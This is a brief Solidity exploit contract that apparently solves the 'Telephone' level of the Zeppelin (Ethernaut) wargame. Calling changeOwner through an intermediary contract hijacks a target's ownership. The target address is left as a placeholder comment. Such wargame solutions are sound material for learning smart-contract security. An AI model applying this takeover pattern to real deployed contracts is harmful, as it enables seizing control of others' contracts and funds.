pragma solidity ^0.4.18;
 
contract Telephone {
  function changeOwner(address _owner) public;
}
contract Telhack {
 
    Telephone target = Telephone(/*Your Zepplin Main Contract Address*/);
 
    function hack(){
        target.changeOwner(msg.sender);
    }
}
